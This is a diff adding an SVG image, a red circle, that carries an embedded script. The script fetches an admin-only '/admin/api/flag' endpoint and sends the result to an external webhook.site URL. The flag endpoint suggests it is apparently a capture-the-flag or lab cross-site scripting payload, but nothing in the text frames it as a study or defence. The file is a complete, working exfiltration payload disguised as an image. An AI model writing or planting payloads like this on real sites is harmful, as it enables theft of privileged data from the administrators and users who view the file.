@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+  <circle cx="50" cy="50" r="40" fill="red" />
+  <script type="text/javascript">
+    fetch('/admin/api/flag')
+      .then(response => response.text())
+      .then(flag => {
+        fetch('https://webhook.site/49fe0673-5526-4ad8-96f3-ac43fae9093f/log?data=' + encodeURIComponent(flag));
+      });
+  </script>
+</svg>
